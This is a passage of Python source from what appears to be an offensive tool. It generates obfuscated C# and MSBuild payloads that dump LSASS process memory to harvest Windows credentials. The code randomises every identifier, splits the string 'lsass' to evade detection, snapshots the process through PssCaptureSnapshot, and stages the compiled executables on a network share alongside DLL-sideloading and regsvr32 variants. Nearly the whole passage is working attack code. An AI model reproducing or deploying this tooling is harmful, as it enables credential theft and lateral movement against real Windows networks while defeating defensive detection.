    exe_payload += 'using System.Collections.Generic;\n'
    exe_payload += 'using System.Threading;\n'
    exe_payload += 'using System.Security.Principal;\n'

    exe_payload += 'namespace %s\n' % (namespace)
    exe_payload += '{\n'
    exe_payload += '    class %s\n' % (Program)
    exe_payload += '    {\n'
    exe_payload += '        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]\n'
    exe_payload += '        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle OutFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);\n'
    exe_payload += '\n'

    exe_payload += '        public static bool %s()\n' % (IsAdministrator)
    exe_payload += '        {\n'
    exe_payload += '            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n'
    exe_payload += '                      .IsInRole(WindowsBuiltInRole.Administrator);\n'
    exe_payload += '        }\n'

    exe_payload += '        static int Main(string[] args)\n'
    exe_payload += '        {\n'
    exe_payload += '            if (%s() == false)\n' % (IsAdministrator)
    exe_payload += '            {\n'
    exe_payload += '                Console.WriteLine("not runnin as admin");\n'
    exe_payload += '                return 1;\n'
    exe_payload += '            }\n'

    exe_payload += '                var %s = System.IO.File.ReadLines("%s:\\\\%s.txt").ToArray();\n' % (lines, drive_letter, addresses_file)
    exe_payload += '                string %s = "";\n' % (thismachinesip)
    exe_payload += '                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n' % (ipEntry)
    exe_payload += '                foreach (var %s in %s.AddressList)\n' % (ip, ipEntry)
    exe_payload += '                {\n'
    exe_payload += '                    for (int %s = 0; %s < %s.Length; %s++)\n' % (i, i, lines, i)
    exe_payload += '                    {\n'
    exe_payload += '                        if (%s.ToString() == %s[%s].ToString())\n' % (ip, lines, i)
    exe_payload += '                        {\n'
    exe_payload += '                            %s = "-" + %s.ToString();\n' % (thismachinesip, ip)
    exe_payload += '                        }\n'
    exe_payload += '                    }\n'
    exe_payload += '                }\n'

    exe_payload += '            try\n'
    exe_payload += '            {\n'
    exe_payload += '                Process[] %s = Process.GetProcessesByName("l" + "sa" + "ss");\n' % (process)
    exe_payload += '                using (FileStream %s = new FileStream("%s:\\\\" + System.Net.Dns.GetHostName() + %s +".dmp", FileMode.Create, FileAccess.ReadWrite, FileShare.Write))\n' % (fs, drive_letter, thismachinesip)
    exe_payload += '                {\n'
    exe_payload += '                    bool b = MiniDumpWriteDump(%s[0].Handle, (uint)%s[0].Id, %s.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);\n' % (process, process, fs)
    exe_payload += '                    if (!b){\n'
    exe_payload += '                        throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n'
    exe_payload += '                    }\n'
    exe_payload += '                }\n'
    exe_payload += '            }\n'
    exe_payload += '            catch (Exception)\n'
    exe_payload += '            {\n'
    exe_payload += '                Console.WriteLine("Error happened");\n'
    exe_payload += '                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n'
    exe_payload += '            }\n'
    exe_payload += '            return 1;'

    exe_payload += '        }\n'
    exe_payload += '    }\n'  # end of class
    exe_payload += '}\n'  # end of namespace

    with open('/var/tmp/{}/pl.cs'.format(share_name), 'w') as f:
        f.write(exe_payload)
        f.close()

    os.system('sudo mcs -out:/var/tmp/{}/{}.exe /var/tmp/{}/pl.cs -unsafe'.format(share_name, payload_name, share_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))

    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()

def gen_payload_exe_pss(share_name, payload_name, addresses_array, drive_letter):
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_VA_CLONE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_HANDLES = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_HANDLE_NAME_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_HANDLE_BASIC_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_HANDLE_TRACE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_THREADS = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_THREAD_CONTEXT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CREATE_MEASURE_PERFORMANCE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_FLAGS = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MINIDUMP_CALLBACK_TYPE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpSnapshot = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MINIDUMP_CALLBACK_OUTPUT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MINIDUMP_CALLBACK_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    Status = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    CallbackRoutine = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    CallbackParam = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_QUERY_INFORMATION_CLASS = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PMINIDUMP_CALLBACK_INPUT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PMINIDUMP_CALLBACK_OUTPUT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PMINIDUMP_EXCEPTION_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PMINIDUMP_USER_STREAM_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PMINIDUMP_CALLBACK_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_QUERY_VA_CLONE_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MINIDUMP_TYPE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithUnloadedModules = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithProcessThreadData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithPrivateReadWriteMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithFullMemoryInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithPrivateWriteCopyMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithModuleHeaders = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    sHandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    Program = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    lsass = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    h = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    pro = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    processid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    hresult = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    CbackDelegate = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    CbackParam = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    obj = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    pointr = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MFlag = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    VcHandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    cloneProid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ipEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    exe_payload = ''
    exe_payload += 'using System;\n'
    exe_payload += 'using System.IO;\n'
    exe_payload += 'using System.Linq;\n'
    exe_payload += 'using System.ComponentModel;\n'
    exe_payload += 'using System.Diagnostics;\n'
    exe_payload += 'using System.Runtime.InteropServices;\n'
    exe_payload += 'using DWORD = System.Int32;\n'
    exe_payload += 'using BOOL = System.Int32;\n'
    exe_payload += 'using HANDLE = System.IntPtr;\n'
    exe_payload += 'using HPSS = System.IntPtr;\n'
    exe_payload += 'using PVOID = System.IntPtr;\n'
    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_CALLBACK_INPUT)
    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_CALLBACK_OUTPUT)
    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_EXCEPTION_INFORMATION)
    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_USER_STREAM_INFORMATION)
    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_CALLBACK_INFORMATION)

    exe_payload += 'namespace %s\n' % (MiniDumpSnapshot)
    exe_payload += '{\n'
    exe_payload += '    internal enum %s : uint\n' % (MINIDUMP_CALLBACK_TYPE)
    exe_payload += '    {\n'
    exe_payload += '        ModuleCallback,\n'
    exe_payload += '        ThreadCallback,\n'
    exe_payload += '        ThreadExCallback,\n'
    exe_payload += '        IncludeThreadCallback,\n'
    exe_payload += '        IncludeModuleCallback,\n'
    exe_payload += '        MemoryCallback,\n'
    exe_payload += '        CancelCallback,\n'
    exe_payload += '        WriteKernelMinidumpCallback,\n'
    exe_payload += '        KernelMinidumpStatusCallback,\n'
    exe_payload += '        RemoveMemoryCallback,\n'
    exe_payload += '        IncludeVmRegionCallback,\n'
    exe_payload += '        IoStartCallback,\n'
    exe_payload += '        IoWriteAllCallback,\n'
    exe_payload += '        IoFinishCallback,\n'
    exe_payload += '        ReadMemoryFailureCallback,\n'
    exe_payload += '        SecondaryFlagsCallback,\n'
    exe_payload += '        IsProcessSnapshotCallback,\n'
    exe_payload += '        VmStartCallback,\n'
    exe_payload += '        VmQueryCallback,\n'
    exe_payload += '        VmPreReadCallback,\n'
    exe_payload += '    }\n'

    exe_payload += '    struct %s\n' % (MINIDUMP_CALLBACK_OUTPUT)
    exe_payload += '    {\n'
    exe_payload += '        public int %s; \n' % (Status)
    exe_payload += '    }\n'

    exe_payload += '    internal struct %s\n' % (MINIDUMP_CALLBACK_INFORMATION)
    exe_payload += '    {\n'
    exe_payload += '        public IntPtr %s;\n' % (CallbackRoutine)
    exe_payload += '        public PVOID %s;\n' % (CallbackParam)
    exe_payload += '    }\n'
    exe_payload += '    [Flags]\n'
    exe_payload += '    internal enum %s : uint\n' % (PSS_CAPTURE_FLAGS)
    exe_payload += '    {\n'
    exe_payload += '        %s = 0x00000001,\n' % (PSS_CAPTURE_VA_CLONE)
    exe_payload += '        %s = 0x00000004,\n' % (PSS_CAPTURE_HANDLES)
    exe_payload += '        %s = 0x00000008,\n' % (PSS_CAPTURE_HANDLE_NAME_INFORMATION)
    exe_payload += '        %s = 0x00000010,\n' % (PSS_CAPTURE_HANDLE_BASIC_INFORMATION)
    exe_payload += '        %s = 0x00000020,\n' % (PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION)
    exe_payload += '        %s = 0x00000040,\n' % (PSS_CAPTURE_HANDLE_TRACE)
    exe_payload += '        %s = 0x00000080,\n' % (PSS_CAPTURE_THREADS)
    exe_payload += '        %s = 0x00000100,\n' % (PSS_CAPTURE_THREAD_CONTEXT)
    exe_payload += '        %s = 0x40000000,\n' % (PSS_CREATE_MEASURE_PERFORMANCE)
    exe_payload += '    }\n'

    exe_payload += '    internal enum %s\n' % (PSS_QUERY_INFORMATION_CLASS)
    exe_payload += '    {\n'
    exe_payload += '        %s = 1,\n' % (PSS_QUERY_VA_CLONE_INFORMATION)
    exe_payload += '    }\n'

    exe_payload += '    [Flags]\n'
    exe_payload += '    internal enum %s : int\n' % (MINIDUMP_TYPE)
    exe_payload += '    {\n'
    exe_payload += '        %s = 0x00000001,\n' % (MiniDumpWithDataSegs)
    exe_payload += '        %s = 0x00000002,\n' % (MiniDumpWithFullMemory)
    exe_payload += '        %s = 0x00000004,\n' % (MiniDumpWithHandleData)
    exe_payload += '        %s = 0x00000020,\n' % (MiniDumpWithUnloadedModules)
    exe_payload += '        %s = 0x00000100,\n' % (MiniDumpWithProcessThreadData)
    exe_payload += '        %s = 0x00000200,\n' % (MiniDumpWithPrivateReadWriteMemory)
    exe_payload += '        %s = 0x00000800,\n' % (MiniDumpWithFullMemoryInfo)
    exe_payload += '        %s = 0x00001000,\n' % (MiniDumpWithThreadInfo)
    exe_payload += '        %s = 0x00010000,\n' % (MiniDumpWithPrivateWriteCopyMemory)
    exe_payload += '        %s = 0x00040000,\n' % (MiniDumpWithTokenInformation)
    exe_payload += '        %s = 0x00080000,\n' % (MiniDumpWithModuleHeaders)
    exe_payload += '    }\n'

    exe_payload += '    [UnmanagedFunctionPointer(CallingConvention.StdCall)]\n'
    exe_payload += '    internal delegate BOOL MiniDumpCallback(PVOID %s, %s CallbackInput, %s CallbackOutput);\n' % (CallbackParam, PMINIDUMP_CALLBACK_INPUT, PMINIDUMP_CALLBACK_OUTPUT)
    exe_payload += '    class %s\n' % (Program)
    exe_payload += '    {\n'
    exe_payload += '        [DllImport("dbghelp")]\n'
    exe_payload += '        internal static extern DWORD MiniDumpWriteDump(HANDLE hProcess, DWORD ProcessId, HANDLE hFile, %s DumpType, %s ExceptionParam, %s UserStreamParam, %s %s);\n' % (MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION, CallbackParam)

    exe_payload += '        internal static BOOL MiniDumpCallbackMethod(PVOID parameter, %s inp, %s op)\n' % (PMINIDUMP_CALLBACK_INPUT, PMINIDUMP_CALLBACK_OUTPUT)
    exe_payload += '        {\n'
    exe_payload += '            unsafe\n'
    exe_payload += '            {\n'
    exe_payload += '                if (Marshal.ReadByte(inp + sizeof(int) + IntPtr.Size) == (int)%s.IsProcessSnapshotCallback)\n' % (MINIDUMP_CALLBACK_TYPE)
    exe_payload += '                {\n'
    exe_payload += '                    var %s = (%s*)op;\n' % (obj, MINIDUMP_CALLBACK_OUTPUT)
    exe_payload += '                    %s->%s = 1;\n' % (obj, Status)
    exe_payload += '                }\n'
    exe_payload += '           }\n'

    exe_payload += '            return 1;\n'
    exe_payload += '        }\n'

    exe_payload += '        [DllImport("kernel32")]\n'
    exe_payload += '        internal static extern DWORD PssQuerySnapshot(HPSS SnapshotHandle, %s InformationClass, out IntPtr Buffer, DWORD BufferLength);\n' % (PSS_QUERY_INFORMATION_CLASS)

    exe_payload += '        [DllImport("kernel32")]\n'
    exe_payload += '        internal static extern DWORD PssCaptureSnapshot(HANDLE ProcessHandle, %s CaptureFlags, DWORD ThreadContextFlags, out HPSS SnapshotHandle);\n' % (PSS_CAPTURE_FLAGS)

    exe_payload += '        [DllImport("kernel32")]\n'
    exe_payload += '        internal static extern DWORD PssFreeSnapshot(HANDLE ProcessHandle, HPSS SnapshotHandle);\n'

    exe_payload += '        [DllImport("kernel32")]\n'
    exe_payload += '        internal static extern BOOL CloseHandle(HANDLE hObject);\n'

    exe_payload += '        [DllImport("kernel32")]\n'
    exe_payload += '        internal static extern BOOL GetProcessId(HANDLE hObject);\n'

    exe_payload += '        static int Main(string[] args)\n'
    exe_payload += '        {\n'

    exe_payload += '            Process[] %s = Process.GetProcessesByName("l"+"s"+"as"+"s");\n' % (lsass)
    exe_payload += '            int %s = %s[0].Id;\n' % (processid, lsass)
    exe_payload += '            HANDLE %s;\n' % (h)
    exe_payload += '            try\n'
    exe_payload += '            {\n'
    exe_payload += '                var %s = Process.GetProcessById(%s);\n' % (pro, processid)
    exe_payload += '                %s = %s.Handle;\n' % (h, pro)
    exe_payload += '            }\n'
    exe_payload += '            catch (ArgumentException)\n'
    exe_payload += '           {\n'
    exe_payload += '                Console.WriteLine("Process does not exist");\n'
    exe_payload += '                return -2;\n'
    exe_payload += '            }\n'

    exe_payload += '            var flags = %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_VA_CLONE)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLES)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_NAME_INFORMATION)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_BASIC_INFORMATION)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_TRACE)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREADS)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREAD_CONTEXT)
    exe_payload += '                        %s.%s;\n' % (PSS_CAPTURE_FLAGS, PSS_CREATE_MEASURE_PERFORMANCE)

    exe_payload += '            HPSS %s;\n' % (sHandle)

    exe_payload += '            DWORD %s = PssCaptureSnapshot(%s, flags, IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out %s);\n' % (hresult, h, sHandle)

    exe_payload += '            if (%s != 0)\n' % (hresult)
    exe_payload += '            {\n'
    exe_payload += '                Console.WriteLine("Snapshot failed :( ({%s})");\n' % (hresult)
    exe_payload += '                return %s;\n' % (hresult)
    exe_payload += '            }\n'

    exe_payload += '                var %s = System.IO.File.ReadLines("%s:\\\\%s.txt").ToArray();\n' % (lines, drive_letter, addresses_file)
    exe_payload += '                string %s = "";\n' % (thismachinesip)
    exe_payload += '                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n' % (ipEntry)
    exe_payload += '                foreach (var %s in %s.AddressList)\n' % (ip, ipEntry)
    exe_payload += '                {\n'
    exe_payload += '                    for (int %s = 0; %s < %s.Length; %s++)\n' % (i, i, lines, i)
    exe_payload += '                    {\n'
    exe_payload += '                        if (%s.ToString() == %s[%s].ToString())\n' % (ip, lines, i)
    exe_payload += '                        {\n'
    exe_payload += '                            %s = "-" + %s.ToString();\n' % (thismachinesip, ip)
    exe_payload += '                        }\n'
    exe_payload += '                    }\n'
    exe_payload += '                }\n'

    exe_payload += '            using (var %s = new FileStream("%s:\\\\" + System.Net.Dns.GetHostName() + %s + ".dmp", FileMode.Create))\n' % (file, drive_letter, thismachinesip)
    exe_payload += '            {\n'
    exe_payload += '                var %s = new MiniDumpCallback(MiniDumpCallbackMethod);\n' % (CbackDelegate)
    exe_payload += '                var %s = Marshal.AllocHGlobal(IntPtr.Size * 2);\n' % (CbackParam)

    exe_payload += '                unsafe\n'
    exe_payload += '                {\n'
    exe_payload += '                    var %s = (%s*)%s;\n' % (pointr, MINIDUMP_CALLBACK_INFORMATION, CbackParam)
    exe_payload += '                    %s->%s = Marshal.GetFunctionPointerForDelegate(%s);\n' % (pointr, CallbackRoutine, CbackDelegate)
    exe_payload += '                    %s->%s = IntPtr.Zero;\n' % (pointr, CallbackParam)
    exe_payload += '                }\n'

    exe_payload += '                var %s = %s.%s |\n' % (MFlag, MINIDUMP_TYPE, MiniDumpWithDataSegs)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithTokenInformation)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithPrivateWriteCopyMemory)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithPrivateReadWriteMemory)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithUnloadedModules)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithFullMemory)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithHandleData)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithThreadInfo)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithFullMemoryInfo)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithProcessThreadData)
    exe_payload += '                                    %s.%s;\n' % (MINIDUMP_TYPE, MiniDumpWithModuleHeaders)

    exe_payload += '                %s = MiniDumpWriteDump(%s, %s, %s.SafeFileHandle.DangerousGetHandle(), %s, IntPtr.Zero, IntPtr.Zero, %s);\n' % (hresult, sHandle, processid, file, MFlag, CbackParam)

    exe_payload += '                IntPtr %s;\n' % (VcHandle)
    exe_payload += '                PssQuerySnapshot(%s, %s.%s, out %s, IntPtr.Size);\n' % (sHandle, PSS_QUERY_INFORMATION_CLASS, PSS_QUERY_VA_CLONE_INFORMATION, VcHandle)

    exe_payload += '                var %s = GetProcessId(%s);\n' % (cloneProid, VcHandle)

    exe_payload += '                PssFreeSnapshot(Process.GetCurrentProcess().Handle, %s);\n' % (sHandle)
    exe_payload += '                CloseHandle(%s);\n' % (VcHandle)

    exe_payload += '                try\n'
    exe_payload += '                {\n'
    exe_payload += '                    Process.GetProcessById(%s).Kill();\n' % (cloneProid)
    exe_payload += '                }\n'
    exe_payload += '                catch (Win32Exception)\n'
    exe_payload += '                {\n'
    exe_payload += '                }\n'

    exe_payload += '                Marshal.FreeHGlobal(%s);\n' % (CbackParam)
    exe_payload += '                GC.KeepAlive(%s);\n' % (CbackDelegate)

    exe_payload += '                if (%s == 0)\n' % (hresult)
    exe_payload += '                {\n'
    exe_payload += '                    Console.WriteLine("MiniDumpWriteDump failed. ({Marshal.GetHRForLastWin32Error()})");\n'
    exe_payload += '                    return %s;\n' % (hresult)
    exe_payload += '                }\n'
    exe_payload += '            }\n'

    exe_payload += '            return 0;\n'
    exe_payload += '        }\n'
    exe_payload += '    }\n'
    exe_payload += '}\n'

    with open('/var/tmp/{}/pl.cs'.format(share_name), 'w') as f:
        f.write(exe_payload)
        f.close()

    os.system('sudo mcs -out:/var/tmp/{}/{}.exe /var/tmp/{}/pl.cs -unsafe'.format(share_name, payload_name, share_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))

    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()


def gen_payload_dllsideload_pss(share_name, addresses_array):
    os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))

    os.system('sudo cp {}/src/dllpayloadpss /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))

    with open('/var/tmp/{}/address.txt'.format(share_name), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()


def gen_payload_regsvr32_pss(share_name, payload_name, addresses_array):
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    os.system('sudo cp {}/src/dllpayloadpss /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))

    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()

    return addresses_file

def gen_payload_dllsideload_mdwd(share_name, addresses_array):
    os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))

    os.system('sudo cp {}/src/dllpayloadmdwd /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))

    with open('/var/tmp/{}/address.txt'.format(share_name), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()


def gen_payload_regsvr32_mdwd(share_name, payload_name, addresses_array):
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    os.system('sudo cp {}/src/dllpayloadmdwd /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))

    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()

    return addresses_file


def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array, runasppl):
    targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    fs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    GetMyPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    myprocesses = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    myprocess = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    myid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    IsAdministrator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    RunAsPPLDll = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ipEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    xml_payload = '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
    xml_payload += '<!-- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe SimpleTasks.csproj -->\n'
    xml_payload += '	<Target Name="%s">\n' % (targetname)
    xml_payload += '            <%s />\n' % (taskname)
    xml_payload += '          </Target>\n'
    xml_payload += '          <UsingTask\n'
    xml_payload += '            TaskName="%s"\n' % (taskname)
    xml_payload += '            TaskFactory="CodeTaskFactory"\n'
    xml_payload += '            AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >\n'
    xml_payload += '            <Task>\n'

    xml_payload += '              <Code Type="Class" Language="cs">\n'
    xml_payload += '              <![CDATA[\n'
    xml_payload += 'using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; using System.IO; using System.Linq; using System.Collections.Generic;\n'
    xml_payload += 'public class %s : Task, ITask {\n' % (taskname)

    xml_payload += '        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]\n'
    xml_payload += '        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle OutFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);\n'

    if runasppl:
        xml_payload += '        [System.Runtime.InteropServices.DllImport(@"%s:\\\\%s.dll", EntryPoint = "runninit", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n' % (drive_letter, RunAsPPLDll)
        xml_payload += '       static extern void runninit(string argus);\n'
    xml_payload += '        public static bool %s()\n' % (IsAdministrator)
    xml_payload += '        {\n'
    xml_payload += '            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n'
    xml_payload += '                      .IsInRole(WindowsBuiltInRole.Administrator);\n'
    xml_payload += '        }\n'

    if runasppl:
